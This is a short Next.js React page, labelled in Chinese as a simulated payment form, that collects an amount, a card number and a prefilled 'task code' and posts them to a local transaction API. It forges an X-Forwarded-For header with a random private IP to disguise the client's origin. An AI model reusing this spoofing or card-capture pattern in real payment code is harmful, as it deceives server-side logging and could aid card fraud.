"use client"
import { useState } from 'react'

export default function Home() {
  const [amount, setAmount] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [agentCode, setAgentCode] = useState('tiktok2024');

  const handleSubmit = async (e) => {
    e.preventDefault();

    const userAgent = navigator.userAgent;
    const fakeIP = '192.168.1.' + Math.floor(Math.random() * 100 + 1);

    const res = await fetch('/api/transaction', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': userAgent,
        'X-Forwarded-For': fakeIP,
      },
      body: JSON.stringify({
        amount,
        cardNumber,
        agentCode,
      }),
    });

    const data = await res.json();
    if (data.redirect) {
      window.location.href = data.redirect;
    }
  };

  return (
    <div className="p-8 max-w-md mx-auto">
      <h1 className="text-2xl font-bold mb-4">模擬付款頁面</h1>
      <form onSubmit={handleSubmit} className="space-y-4">
        <input
          type="text"
          placeholder="金額"
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
          className="w-full border p-2 rounded"
        />
        <input
          type="text"
          placeholder="卡號"
          value={cardNumber}
          onChange={(e) => setCardNumber(e.target.value)}
          className="w-full border p-2 rounded"
        />
        <input
          type="text"
          placeholder="任務代碼 (agentCode)"
          value={agentCode}
          onChange={(e) => setAgentCode(e.target.value)}
          className="w-full border p-2 rounded"
        />
        <button type="submit" className="w-full bg-blue-500 text-white py-2 rounded">模擬付款</button>
      </form>
    </div>
  )
}
